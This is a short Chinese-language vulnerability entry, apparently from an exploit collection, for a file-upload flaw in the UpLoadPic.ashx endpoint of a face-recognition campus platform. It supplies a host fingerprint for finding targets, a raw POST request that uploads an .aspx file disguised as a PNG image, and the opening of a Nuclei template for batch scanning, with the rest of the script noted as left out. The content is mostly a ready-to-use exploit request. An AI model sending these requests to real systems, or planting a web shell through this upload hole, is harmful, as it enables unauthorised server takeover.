# 脸爱云一脸通智慧平台UpLoadPic文件上传漏洞

- **系统**：脸爱云一脸通智慧平台UpLoadPic　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="View/UserReserved/UserReservedTest.aspx"`
- **请求**：`POST /UpLoadPic.ashx HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Length: 431`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1e…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"
post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
Content-Type: image/png
<% response.write("FC5E038D38A57032085441E7FE7010B0") %>
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"
------WebKitFormBoundarywt7cEu1eBdibB13u--
Nuclei批量检测-文件名保存为yaml即可：
id: POC-Jocat-layun-UpLoadPic-uploadfile
info:
name: 脸爱云一脸通智慧管理平台UpLoadPic.ashx文件上传漏洞
author: HackTwo
severity: critical
http:
- raw:
-
POST /UpLoadPic.ashx HTTP/1.…（脚本共 1397 字，完整版见原文）
```